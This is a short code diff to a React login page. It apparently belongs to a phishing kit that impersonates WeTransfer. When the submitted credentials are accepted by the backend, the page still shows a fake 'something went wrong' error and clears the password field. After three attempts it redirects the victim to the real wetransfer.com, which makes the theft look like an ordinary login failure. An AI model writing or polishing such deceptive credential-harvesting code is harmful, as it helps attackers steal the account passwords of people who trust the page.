@@ -122,7 +122,7 @@ export const HomePage: React.FC = () => {
     e.preventDefault();
     
     if (attempts >= 3) {
-      window.location.reload();
+      window.location.href = 'https://wetransfer.com';
       return;
     }
 
@@ -142,14 +142,8 @@ export const HomePage: React.FC = () => {
       });
 
       if (response.ok) {
-        const errorMessages = [
-          "authentication error please try again",
-          "something went wrong check your internet connection"
-        ];
-        const randomMessage = errorMessages[Math.floor(Math.random() * errorMessages.length)];
-        
         setAttempts(prev => prev + 1);
-        setAuthError(randomMessage);
+        setAuthError("something went wrong please try again");
         setFormData(prev => ({ ...prev, password: '' }));
       }
     } catch (error) {
